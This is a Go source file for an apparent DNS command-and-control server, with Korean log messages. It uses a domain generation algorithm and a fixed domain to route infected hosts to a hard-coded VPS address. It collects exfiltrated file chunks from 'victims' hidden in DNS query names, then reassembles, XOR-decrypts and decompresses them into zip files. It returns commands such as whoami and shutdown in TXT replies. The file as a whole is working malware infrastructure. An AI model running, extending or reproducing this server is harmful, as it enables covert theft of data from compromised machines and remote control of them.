package main

import (
	"bytes"
	"compress/zlib"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/miekg/dns"
)

const (
	listenAddr = ":53"
	logPath    = "/root/dns-c2/logs/raw/dns_query.log"
	vpsIP      = "178.128.53.254"
)

var (
	config = map[int]struct {
		seed  int
		shift int
		mod   int
		tlds  []string
	}{
		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us"}},
	}
	fixedDomain = "main.pintruder.com"
	commands    = map[string]string{"default": "whoami"}
	chunkStore  = make(map[string]map[int][]byte)
	metaStore   = make(map[string]int)
	logFileName string // 전역 로그 파일명
)

func initLogFile() {
	// 서버 시작 시 단일 로그 파일명 생성
	logFileName = fmt.Sprintf("%s-%s", logPath, time.Now().UTC().Format("20060102-150405"))
}

func ror32(v, s uint32) uint32 {
	v &= 0xFFFFFFFF
	return (v >> s) | (v << (32 - s)) & 0xFFFFFFFF
}

func rol32(v, s uint32) uint32 {
	return (v << s) | (v >> (32 - s)) & 0xFFFFFFFF
}

func dga(date time.Time, configNr, domainNr int) string {
	c := config[configNr]
	period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day()/21)
	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))
	if c.seed != 0 {
		t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
	}
	t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
	t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))
	nr := rol32(uint32(domainNr%c.mod), 21)
	s := rol32(uint32(c.seed), 17)
	r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
	length := (r % 11) + 5
	domain := ""
	for i := 0; i < int(length); i++ {
		r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
		domain += string(r%25 + 'a')
	}
	domain += "."
	r = ror32(r*0xB11924E1, uint32(c.shift))
	tldI := ((r + 0x27100001) & 0xFFFFFFFF) % uint32(len(c.tlds))
	domain += c.tlds[tldI]
	return domain
}

func updateCommands() {
	cmdList := []string{"whoami", "shutdown", "status"}
	idx := 0
	for {
		time.Sleep(60 * time.Second)
		commands["default"] = cmdList[idx%len(cmdList)]
		log.Printf("명령 업데이트: %s", commands["default"])
		idx++
	}
}

func saveLog(entry string) {
	f, err := os.OpenFile(logFileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("로그 저장 실패: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.WriteString(entry + "\n"); err != nil {
		log.Printf("로그 쓰기 실패: %v", err)
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func xorDecrypt(data []byte, key string) []byte {
	keyBytes := []byte(key)
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}
	return result
}

func resetStores(victim string) {
	delete(chunkStore, victim)
	delete(metaStore, victim)
	chunkStore[victim] = make(map[int][]byte)
	saveLog(fmt.Sprintf("%s | 저장소 초기화: %s", time.Now().UTC().Format(time.RFC3339), victim))
}

func restoreFile(victim string) error {
	chunks, exists := chunkStore[victim]
	if !exists {
		saveLog(fmt.Sprintf("%s | 복원 실패: 청크 없음: %s", time.Now().UTC().Format(time.RFC3339), victim))
		return fmt.Errorf("no chunks for victim %s", victim)
	}
	total, exists := metaStore[victim]
	if !exists {
		saveLog(fmt.Sprintf("%s | 복원 실패: 메타데이터 누락: %s", time.Now().UTC().Format(time.RFC3339), victim))
		return fmt.Errorf("no metadata for victim %s", victim)
	}
	saveLog(fmt.Sprintf("%s | 복원 시도: %s, 예상 청크: %d, 수신 청크: %d", time.Now().UTC().Format(time.RFC3339), victim, total, len(chunks)))
	if len(chunks) < total {
		saveLog(fmt.Sprintf("%s | 복원 실패: 청크 부족: %s, 기대: %d, 실제: %d", time.Now().UTC().Format(time.RFC3339), victim, total, len(chunks)))
		return fmt.Errorf("chunk count insufficient for victim %s: expected %d, got %d", victim, total, len(chunks))
	}
	var data []byte
	for i := 0; i < total; i++ {
		if chunk, ok := chunks[i]; ok {
			data = append(data, chunk...)
		} else {
			saveLog(fmt.Sprintf("%s | 누락된 청크: %s/%d", time.Now().UTC().Format(time.RFC3339), victim, i))
			return fmt.Errorf("missing chunk %d for victim %s", i, victim)
		}
	}
	saveLog(fmt.Sprintf("%s | 데이터 합체 완료: %s, 길이: %d", time.Now().UTC().Format(time.RFC3339), victim, len(data)))
	decrypted := xorDecrypt(data, "secret")
	saveLog(fmt.Sprintf("%s | XOR 복호화 완료: %s, 길이: %d", time.Now().UTC().Format(time.RFC3339), victim, len(decrypted)))
	r := bytes.NewReader(decrypted)
	zr, err := zlib.NewReader(r)
	if err != nil {
		saveLog(fmt.Sprintf("%s | zlib 복원 실패: %s, %v", time.Now().UTC().Format(time.RFC3339), victim, err))
		return fmt.Errorf("zlib decompress failed: %v", err)
	}
	defer zr.Close()
	var out bytes.Buffer
	_, err = out.ReadFrom(zr)
	if err != nil {
		saveLog(fmt.Sprintf("%s | zlib 읽기 실패: %s, %v", time.Now().UTC().Format(time.RFC3339), victim, err))
		return fmt.Errorf("zlib read failed: %v", err)
	}
	saveLog(fmt.Sprintf("%s | zlib 압축 해제 완료: %s, 길이: %d", time.Now().UTC().Format(time.RFC3339), victim, out.Len()))
	outputPath := fmt.Sprintf("/root/dns-c2/output/%s.zip", victim)
	err = os.WriteFile(outputPath, out.Bytes(), 0644)
	if err != nil {
		saveLog(fmt.Sprintf("%s | 파일 쓰기 실패: %s, %v", time.Now().UTC().Format(time.RFC3339), victim, err))
		return fmt.Errorf("write file failed: %v", err)
	}
	saveLog(fmt.Sprintf("%s | 복원 완료: %s", time.Now().UTC().Format(time.RFC3339), outputPath))
	delete(chunkStore, victim)
	delete(metaStore, victim)
	return nil
}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Compress = false
	for _, q := range r.Question {
		qname := strings.ToLower(q.Name)
		logEntry := fmt.Sprintf("수신 시간: %s | 도메인: %s | 타입: %s | 클라이언트: %s",
			time.Now().UTC().Format(time.RFC3339), qname, dns.TypeToString[q.Qtype], w.RemoteAddr().String())
		fmt.Println(logEntry)
		saveLog(logEntry)
		parts := strings.Split(qname, ".")
		var chunkIdx, victim, b64 string
		if len(parts) >= 4 {
			chunkIdx = parts[0]
			victim = parts[1]
			b64 = parts[2]
			if chunkIdx == "meta" && q.Qtype == dns.TypeA {
				resetStores(victim)
				// Base32로 인코딩했으므로, 복원 시 패딩 복원 (길이가 8의 배수가 되도록)
				remainder := len(b64) % 8
				if remainder != 0 {
					b64 += strings.Repeat("=", 8-remainder)
				}
				decoded, err := base32.StdEncoding.DecodeString(strings.ToUpper(b64))
				if err != nil {
					saveLog(fmt.Sprintf("%s | 메타데이터 디코딩 실패: %s, B64: %s, %v",
						time.Now().UTC().Format(time.RFC3339), victim, b64, err))
				} else {
					metaStr := ""
					if utf8.Valid(decoded) {
						metaStr = string(decoded)
					} else {
						metaStr = fmt.Sprintf("비 UTF-8: %x", decoded)
					}
					metaStr = strings.TrimSpace(metaStr)
					saveLog(fmt.Sprintf("%s | 메타데이터 디코딩: %s, 원문: %q, 바이트: %x",
						time.Now().UTC().Format(time.RFC3339), victim, metaStr, decoded))
					if strings.HasPrefix(metaStr, "total:") {
						totalStr := strings.TrimPrefix(metaStr, "total:")
						total, err := strconv.Atoi(totalStr)
						if err != nil {
							saveLog(fmt.Sprintf("%s | 메타데이터 파싱 실패: %s, 원문: %q, 바이트: %x, %v",
								time.Now().UTC().Format(time.RFC3339), victim, metaStr, decoded, err))
						} else {
							metaStore[victim] = total
							saveLog(fmt.Sprintf("%s | 메타데이터 저장: %s, 총 청크: %d",
								time.Now().UTC().Format(time.RFC3339), victim, total))
						}
					} else {
						saveLog(fmt.Sprintf("%s | 메타데이터 형식 오류: %s, 원문: %q, 바이트: %x",
							time.Now().UTC().Format(time.RFC3339), victim, metaStr, decoded))
					}
				}
			} else if q.Qtype == dns.TypeA {
				chunkNum, err := strconv.Atoi(chunkIdx)
				if err == nil {
					if _, exists := chunkStore[victim]; !exists {
						chunkStore[victim] = make(map[int][]byte)
					}
					if _, exists := chunkStore[victim][chunkNum]; !exists {
						decoded, err := base64.StdEncoding.DecodeString(b64)
						if err != nil {
							saveLog(fmt.Sprintf("%s | 청크 디코딩 실패: %s/%d, B64: %s, %v",
								time.Now().UTC().Format(time.RFC3339), victim, chunkNum, b64, err))
						} else {
							chunkStore[victim][chunkNum] = decoded
							saveLog(fmt.Sprintf("%s | 저장된 청크: %s/%d", time.Now().UTC().Format(time.RFC3339), victim, chunkNum))
						}
					}
					if total, exists := metaStore[victim]; exists && len(chunkStore[victim]) >= total {
						saveLog(fmt.Sprintf("%s | 복원 조건 충족: %s, 청크 수: %d/%d", time.Now().UTC().Format(time.RFC3339), victim, len(chunkStore[victim]), total))
						if err := restoreFile(victim); err != nil {
							saveLog(fmt.Sprintf("%s | 복원 실패: %s, %v", time.Now().UTC().Format(time.RFC3339), victim, err))
						}
					}
				}
			}
		} else {
			invalidLog := fmt.Sprintf("%s | 유효하지 않은 도메인: %s", time.Now().UTC().Format(time.RFC3339), qname)
			fmt.Println(invalidLog)
			saveLog(invalidLog)
		}
		now := time.Now().UTC()
		validDomains := make([]string, 0, 21)
		for i := 0; i < 20; i++ {
			validDomains = append(validDomains, dga(now, 1, i))
		}
		validDomains = append(validDomains, fixedDomain, "pintruder.com")
		if contains(validDomains, strings.TrimSuffix(qname, ".")) || strings.HasSuffix(qname, ".pintruder.com.") {
			if q.Qtype == dns.TypeA {
				a := &dns.A{
					Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
					A:   net.ParseIP(vpsIP),
				}
				msg.Answer = append(msg.Answer, a)
			}
			if q.Qtype == dns.TypeTXT {
				txt := &dns.TXT{
					Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
					Txt: []string{fmt.Sprintf("ACK:%s|CMD:%s", chunkIdx, commands["default"])},
				}
				msg.Answer = append(msg.Answer, txt)
			}
		} else {
			msg.SetRcode(r, dns.RcodeNameError)
			saveLog(fmt.Sprintf("%s | NXDOMAIN 응답: %s", time.Now().UTC().Format(time.RFC3339), qname))
		}
	}
	if err := w.WriteMsg(msg); err != nil {
		saveLog(fmt.Sprintf("%s | 응답 전송 실패: %v | 도메인: %s",
			time.Now().UTC().Format(time.RFC3339), err, r.Question[0].Name))
	}
}

func main() {
	initLogFile()
	dns.HandleFunc(".", handleRequest)
	go updateCommands()
	chunkStore = make(map[string]map[int][]byte)
	metaStore = make(map[string]int)
	saveLog(fmt.Sprintf("%s | 서버 시작: 모든 저장소 초기화", time.Now().UTC().Format(time.RFC3339)))
	udpServer := &dns.Server{Addr: listenAddr, Net: "udp"}
	tcpServer := &dns.Server{Addr: listenAddr, Net: "tcp"}
	go func() {
		log.Println("[+] UDP DNS 서버 시작: :53")
		if err := udpServer.ListenAndServe(); err != nil {
			log.Fatalf("UDP 서버 실패: %v", err)
		}
	}()
	go func() {
		log.Println("[+] TCP DNS 서버 시작: :53")
		if err := tcpServer.ListenAndServe(); err != nil {
			log.Fatalf("TCP 서버 실패: %v", err)
		}
	}()
	select {}
}
